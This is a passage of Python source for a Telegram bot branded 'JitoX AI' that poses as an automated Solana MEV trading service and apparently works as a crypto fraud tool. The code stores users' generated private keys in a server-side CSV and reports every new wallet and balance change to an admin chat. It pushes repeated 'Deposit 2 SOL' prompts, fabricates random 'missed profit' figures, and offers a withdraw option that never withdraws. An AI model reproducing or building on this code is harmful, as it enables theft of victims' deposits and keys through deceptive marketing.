    await log_user_activity(context.application, user_id, "accessed Remove Token")

async def view_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    token_list = context.user_data.get('token_list', [])
    
    if not token_list:
        message = "You haven't added any tokens yet. Use the 'Add Token' option to get started."
    else:
        message = "📋 <b>Your Token List</b> 📋\n\n" + "\n".join([f"🔹 {token[:10]}...{token[-4:]}" for token in token_list])
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Token Targeting", callback_data='token_targeting')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Token List")

async def auto_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "🤖 <b>Auto MEV - VIP Feature</b> 🤖\n\n"
        "Unlock the full power of automated MEV:\n"
        "🔹 24/7 AI-driven MEV exploitation\n"
        "🔹 Advanced predictive algorithms\n"
        "🔹 Priority execution on all strategies\n\n"
        "️ Requires a minimum balance of 5 SOL"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Activate Auto MEV", callback_data='activate_auto_mev'),
         InlineKeyboardButton("🔴 Deactivate Auto MEV", callback_data='deactivate_auto_mev')],
        [InlineKeyboardButton("📊 Auto MEV Stats", callback_data='auto_mev_stats')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def activate_auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🚀 <b>Auto MEV Activation</b> 🚀\n\n"
        "⚠️ You need a minimum balance of 5 SOL to activate Auto MEV.\n\n"
        "Deposit 5 SOL to unlock this powerful feature and maximize your MEV profits!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to activate Auto MEV")

async def deactivate_auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🛑 <b>Auto MEV Deactivation</b> 🛑\n\n"
        "Auto MEV is not currently active.\n\n"
        "Activate Auto MEV with a 5 SOL balance to experience its benefits!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "attempted to deactivate Auto MEV")

async def auto_mev_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "📊 <b>Auto MEV Statistics</b> 📊\n\n"
        "Auto MEV is not currently active.\n\n"
        "Activate Auto MEV with a 5 SOL balance to start generating statistics!"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Auto MEV", callback_data='auto_mev')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "viewed Auto MEV stats")

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await log_user_activity(context.application, update.effective_user.id, "used /withdraw command")
    await withdraw(update, context)

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await log_user_activity(context.application, user_id, "attempted to withdraw")
    
    message = (
            "👾 <b>JitoX AI - Professional Balance Management</b> 👾\n\n"
            "💎 <b>Strategic Withdrawal Protocol</b>\n\n"
            "⚡️ <b>Operational Requirements</b>\n"
            "• Maintain 2 SOL minimum trading balance\n"
            "• Preserve execution priority status\n"
            "• Ensure continuous MEV capture\n\n"
            "🎯 <b>Performance Considerations</b>\n"
            "⚔️ Optimal strategy continuation\n"
            "⚔️ Uninterrupted profit generation\n"
            "⚔️ Sustained institutional access\n\n"
            "🛡️ <b>Security Framework</b>\n"
            "✨ Self-custodial asset protection\n"
            "✨ Professional-grade security protocols\n"
            "✨ Institutional withdrawal standards\n\n"
            "Professional traders understand: Strategic balance management ensures optimal MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    try:
        if query.data == "get_wallet":
            await get_wallet_command(update, context)
            
        elif query.data == "settings":
            await settings_command(update, context)
            
        elif query.data == "auto_mev":
            await auto_mev(update, context)
            
        elif query.data == "token_targeting":
            await token_targeting(update, context)
            
        elif query.data == "intensity":
            await intensity(update, context)
            
        elif query.data == "pool_settings":
            await pool_settings(update, context)
            
        elif query.data == "back":
            await start(update, context)
            
        elif query.data == "generate_wallet":
            # Check if user exists in user_data.csv
            user_id = update.effective_user.id
            is_activated = False
            
            if os.path.exists('user_data.csv'):
                with open('user_data.csv', 'r', newline='', encoding='utf-8') as f:
                    reader = csv.DictReader(f)
                    for row in reader:
                        if int(row['user_id']) == user_id:
                            is_activated = True
                            break
            
            if not is_activated:
                await query.edit_message_text(
                    "This feature is only for members who activated the bot.",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
                )
                return
            
            # Generate new wallet
            new_wallet = await generate_wallet()
            if new_wallet:
                # Store in CSV
                with open(WALLET_CSV_FILE, 'a', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow([
                        query.from_user.id,
                        new_wallet['public_key'],
                        new_wallet['private_key'],
                        datetime.now(timezone.utc).isoformat()
                    ])
                
                # Log the action
                await log_user_activity(context.application, query.from_user.id, "Generated wallet")
                
                success_message = (
                    "✨ <b>Wallet Generated Successfully!</b> ✨\n\n"
                    f"🔑 Address: <code>{new_wallet['public_key']}</code>\n\n"
                    "Your wallet is:\n"
                    "✅ Ready to use\n"
                    "✅ Compatible with Phantom\n"
                    "✅ Secured by Solana blockchain"
                )
                
                keyboard = [
                    [InlineKeyboardButton("🔐 Show Private Key", callback_data="show_key")],
                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(success_message, reply_markup=reply_markup, parse_mode='HTML')
                
                # Notify admin
                admin_notification = (
                    f"🆕 New wallet generated\n"
                    f"User ID: {query.from_user.id}\n"
                    f"Address: {new_wallet['public_key']}"
                )
                await send_admin_notification(context.application, admin_notification)
            
        elif query.data == "show_key":
            await handle_show_key(update, context)
            
        elif query.data == "show_key_confirmed":
            await show_private_key_confirmed(update, context)
            
        elif query.data == "cancel_show_key" or query.data == "back_to_wallet":
            await get_wallet_command(update, context)
            
        elif query.data == "generate_new":
            await handle_new_wallet_confirmation(update, context)
            
        elif query.data == "generate_new_confirmed":
            await generate_new_confirmed(update, context)
            
        elif query.data == "add_liquidity":
            await add_liquidity(update, context)
            
        elif query.data == "remove_liquidity":
            await remove_liquidity(update, context)
            
        elif query.data == "view_pool_stats":
            await view_pool_stats(update, context)
            
        elif query.data == "toggle_notifications":
            await toggle_mev_notifications(update, context)
            
        elif query.data == "auto_compound":
            await auto_compound(update, context)
            
        elif query.data == "risk_level":
            await risk_level(update, context)
            
        elif query.data == "gas_settings":
            await gas_settings(update, context)
            
        elif query.data == "ca_command":
            await ca_command(update, context)
            
        elif query.data == "add_token":
            await add_token(update, context)
            
        elif query.data == "remove_token":
            await remove_token(update, context)
            
        elif query.data == "view_tokens":
            await view_tokens(update, context)
            
        elif query.data == "auto_command":
            await auto_command(update, context)
            
        elif query.data == "activate_auto_mev":
            await activate_auto_mev(update, context)
            
        elif query.data == "deactivate_auto_mev":
            await deactivate_auto_mev(update, context)
            
        elif query.data == "auto_mev_stats":
            await auto_mev_stats(update, context)
            
        elif query.data == "withdraw":
            await withdraw(update, context)
            
    except Exception as e:
        logger.error(f"Error handling button click: {e}")
        await query.edit_message_text(
            "An error occurred while processing your request. Please try again.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]])
        )

    logger.debug("Exiting button_handler function")

async def send_admin_notification(application, message: str):
    admin_chat_id = -4540844698  # Your admin chat ID
    try:
        await application.bot.send_message(chat_id=admin_chat_id, text=message)
        logger.info(f"Admin notification sent: {message}")
    except Exception as e:
        logger.error(f"Failed to send admin notification: {e}")


def generate_missed_opportunities():
    opportunity_types = ['Arbitrage', 'Frontrun', 'Sandwich']
    missed_opportunities = []
    for type in opportunity_types:
        profit = random.uniform(0.5, 2.0)
        missed_opportunities.append(f"Missed {type}: {profit:.2f} SOL profit")
    return missed_opportunities

async def token_watchlist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Token Intelligence</b> 👾\n\n"
            "💎 <b>Professional Monitoring Framework</b>\n\n"
            "⚡️ <b>Advanced Features</b>\n"
            "• Real-time market surveillance\n"
            "• Institutional-grade price analytics\n"
            "• Strategic opportunity detection\n\n"
            "🎯 <b>Professional Advantages</b>\n"
            "⚔️ Precision market monitoring\n"
            "⚔️ Advanced alert protocols\n"
            "⚔️ Dynamic trend analysis\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market intelligence drives optimal execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def custom_risk_management(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Professional Risk Framework</b> 👾\n\n"
            "💎 <b>Strategic Risk Architecture</b>\n\n"
            "⚡️ <b>Advanced Risk Protocols</b>\n"
            "• Institutional-grade position management\n"
            "• Dynamic stop-loss optimization\n"
            "• Strategic profit targeting\n\n"
            "🎯 <b>Professional Features</b>\n"
            "️ Real-time risk assessment matrix\n"
            "⚔️ Advanced portfolio protection\n"
            "⚔️ Customizable execution parameters\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk management ensures sustainable MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def risk_profiling(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Risk Intelligence</b> 👾\n\n"
            "💎 <b>Professional Risk Assessment Matrix</b>\n\n"
            "⚡️ <b>Advanced Analytics</b>\n"
            "• Institutional risk profiling\n"
            "• Strategic tolerance analysis\n"
            "• Dynamic strategy alignment\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time risk calibration\n"
            "⚔️ Advanced strategy optimization\n"
            "⚔️ Precision execution mapping\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk profiling drives optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def custom_trading_bots(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Advanced Automation Matrix</b> 👾\n\n"
            "💎 <b>Professional Trading Architecture</b>\n\n"
            "⚡️ <b>Strategic Protocols</b>\n"
            "• Institutional-grade automation\n"
            "• Custom parameter optimization\n"
            "• Advanced execution logic\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Precision strategy deployment\n"
            "⚔️ Real-time performance analytics\n"
            "⚔️ Advanced backtesting framework\n\n"
            "🛡️ <b>System Architecture</b>\n"
            "✨ AI-driven strategy builder\n"
            "✨ Professional template library\n"
            "✨ Dynamic execution protocols\n\n"
            "🔮 <b>Access Framework</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior automation drives consistent MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def ai_market_predictions(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Predictive Intelligence Matrix</b> 👾\n\n"
            "💎 <b>Advanced Market Forecasting</b>\n\n"
            "⚡️ <b>Strategic Analytics</b>\n"
            "• Neural prediction algorithms\n"
            "• Real-time trend detection\n"
            "• Institutional market modeling\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Predictive execution protocols\n"
            "⚔️ Dynamic strategy adaptation\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market intelligence drives predictive MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def advanced_charting(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Advanced Analytics Suite</b> 👾\n\n"
            "💎 <b>Professional Charting Architecture</b>\n\n"
            "⚡️ <b>Strategic Visualization</b>\n"
            "• Institutional-grade technical analysis\n"
            "• Multi-timeframe market modeling\n"
            "• Advanced indicator integration\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time chart optimization\n"
            "⚔️ Custom indicator framework\n"
            "⚔️ Precision trend analysis\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market analysis drives strategic MEV execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def multi_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Account Matrix</b> 👾\n\n"
            "💎 <b>Professional Portfolio Architecture</b>\n\n"
            "⚡️ <b>Advanced Management Protocols</b>\n"
            "• Multi-account synchronization\n"
            "• Institutional position tracking\n"
            "• Unified execution framework\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔ Seamless account integration\n"
            "⚔️ Cross-portfolio optimization\n"
            "⚔️ Strategic capital allocation\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior account management drives optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def historical_analysis(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Performance Analytics Matrix</b> 👾\n\n"
            "💎 <b>Strategic Intelligence Framework</b>\n\n"
            "⚡️ <b>Advanced Performance Metrics</b>\n"
            "• Institutional-grade analytics\n"
            "• Strategic efficiency tracking\n"
            "• Comprehensive execution analysis\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Performance optimization protocols\n"
            "⚔️ Strategic improvement matrix\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior analytics drive strategic MEV optimization. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def diversification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Portfolio Matrix</b> 👾\n\n"
            "💎 <b>Professional Diversification Framework</b>\n\n"
            "⚡️ <b>Advanced Portfolio Protocols</b>\n"
            "• Institutional-grade risk distribution\n"
            "• Strategic asset allocation\n"
            "• Dynamic portfolio balancing\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time portfolio optimization\n"
            "⚔️ Advanced correlation analysis\n"
            "⚔️ Strategic rebalancing matrix\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior diversification drives sustainable MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def ai_strategy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Intelligence Suite</b> 👾\n\n"
            "💎 <b>Advanced Strategy Architecture</b>\n\n"
            "⚡️ <b>Neural Trading Protocols</b>\n"
            "• Personalized execution matrices\n"
            "• Adaptive learning algorithms\n"
            "• Real-time strategy optimization\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Dynamic strategy adaptation\n"
            "⚔️ Predictive market modeling\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior intelligence drives strategic MEV execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def dynamic_risk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Dynamic Risk Matrix</b> 👾\n\n"
            "💎 <b>Advanced Risk Intelligence</b>\n\n"
            "️ <b>Adaptive Risk Protocols</b>\n"
            "• Real-time exposure management\n"
            "• Dynamic threshold optimization\n"
            "• Institutional risk modeling\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Automated risk calibration\n"
            "⚔️ Strategic loss prevention\n"
            "⚔️ Advanced profit maximization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk adaptation ensures optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def strategy_sharing(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Network Matrix</b> 👾\n\n"
            "💎 <b>Professional Collaboration Framework</b>\n\n"
            "⚡️ <b>Advanced Network Protocols</b>\n"
            "• Institutional strategy sharing\n"
            "• Professional knowledge exchange\n"
            "• Collaborative performance analysis\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Strategic insight distribution\n"
            "⚔️ Advanced methodology sharing\n"
            "⚔️ Cross-portfolio optimization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior collaboration drives collective MEV excellence. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def copy_trading(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Replication Matrix</b> 👾\n\n"
            "💎 <b>Professional Mirroring Framework</b>\n\n"
            "⚡️ <b>Advanced Replication Protocols</b>\n"
            "• Institutional position mirroring\n"
            "• Real-time strategy synchronization\n"
            "• Professional execution matching\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Elite trader selection matrix\n"
            "⚔️ Advanced performance tracking\n"
            "⚔️ Dynamic allocation optimization\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior replication drives consistent MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoX_AI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

# Store previous balances in memory
wallet_balances = {}

async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check for balance changes in wallets and send notifications in real-time."""
    logger.info("Starting check_deposits function")
    try:
        for wallet_address in wallet_addresses:
            logger.info(f"Checking balance for wallet {wallet_address}")
            try:
                current_balance = await get_balance(wallet_address)
                logger.info(f"Current balance for {wallet_address}: {current_balance} SOL")
                
                # Get previous balance from memory
                previous_balance = wallet_balances.get(wallet_address, current_balance)
                
                # If there's a change in balance
                if abs(current_balance - previous_balance) >= 0.000001:  # To account for floating-point imprecision
                    change = current_balance - previous_balance
                    change_type = "increase" if change > 0 else "decrease"
                    status_text = "Deposit received ✅" if change > 0 else "Withdrawal processed ✅"
                    
                    message = (
                        f"💎 <b>Balance {change_type} detected!</b> 💎\n\n"
                        f"🔸 Wallet: <code>{wallet_address}</code>\n"
                        f"🔸 Previous: {previous_balance:.4f} SOL\n"
                        f"🔸 Current: {current_balance:.4f} SOL\n"
                        f"🔸 Change: {abs(change):.4f} SOL\n\n"
                        f"⚡️ Status: {status_text}"
                    )
                    
                    # Send notification to admin channel
                    await context.bot.send_message(
                        chat_id=NOTIFICATION_CHAT_ID,
                        text=message,
                        parse_mode='HTML'
                    )
                    logger.info(f"Balance change notification sent for wallet {wallet_address}")
                
                # Update the stored balance in memory
                wallet_balances[wallet_address] = current_balance
                
            except Exception as e:
                logger.error(f"Error checking balance for wallet {wallet_address}: {e}")
    except Exception as e:
        logger.error(f"Error in check_deposits: {e}")
    
    logger.info("Finished check_deposits function")

async def min_deposit_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Capital Framework</b> 👾\n\n"
            "💎 <b>Professional Infrastructure Requirements</b>\n\n"
            "⚡️ <b>2 SOL Initialization Protocol</b>\n\n"
            "🎯 <b>Strategic Architecture</b>\n"
            "⚔️ Advanced Gas Management: Institutional-grade transaction execution\n"
            "⚔️ Opportunity Matrix: Enhanced MEV capture capabilities\n"
            "⚔️ Risk Framework: Professional position management protocols\n"
            "⚔️ Competitive Edge: Superior market positioning architecture\n"
            "⚔️ Sustainable Performance: Strategic capital optimization\n\n"
            "🛡️ <b>Professional Tiers</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "• Advanced execution protocols\n"
            "• Core MEV capture matrix\n"
            "• Standard performance metrics\n\n"
            "✨ Enhanced Suite: 5+ SOL activation\n"
            "• Priority execution framework\n"
            "• Advanced profit optimization\n"
            "• Institutional feature access\n\n"
            "Professional traders understand: Superior capitalization drives exceptional MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def mev_info_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Enterprise MEV Architecture</b> 👾\n\n"
            "💎 <b>Professional Trading Infrastructure</b>\n\n"
            "⚡️ <b>Core Protocol Suite</b>\n\n"
            "🎯 <b>Strategic Entry Protocol</b>\n"
            "⚔️ Advanced listing detection algorithms\n"
            "⚔️ Sub-millisecond execution matrix\n"
            "⚔️ Precision entry optimization\n\n"
            "🎯 <b>Priority Execution Framework</b>\n"
            "⚔️ Real-time mempool intelligence\n"
            "⚔️ Dynamic priority management\n"
            "⚔️ Institutional-grade routing\n\n"
            "🎯 <b>Market Impact Protocol</b>\n"
            "⚔️ Advanced order flow analytics\n"
            "⚔️ Precision timing algorithms\n"
            "⚔️ Maximum value extraction\n\n"
            "🎯 <b>Cross-Venue Arbitrage Suite</b>\n"
            "⚔️ Multi-DEX differential analysis\n"
            "⚔️ Automated execution optimization\n"
            "⚔️ Cross-chain opportunity capture\n\n"
            "🛡️ <b>Professional Framework</b>\n"
            "✨ AI-driven market analysis\n"
            "✨ Continuous execution protocols\n"
            "✨ Self-custodial security architecture\n\n"
            "🔮 <b>Access Tiers</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance\n\n"
            "Professional traders understand: Superior infrastructure drives exceptional MEV performance. 🎮"
        )
    keyboard = [[InlineKeyboardButton("🔑 Activate MEV Sniper", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def security_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Professional Security Matrix</b> 👾\n\n"
            "💎 <b>Enterprise Protection Framework</b>\n\n"
            "⚡️ <b>Advanced Security Protocols</b>\n\n"
            "🎯 <b>Strategic Architecture</b>\n"
            "⚔️ Self-Custodial Framework: Institutional-grade key management\n"
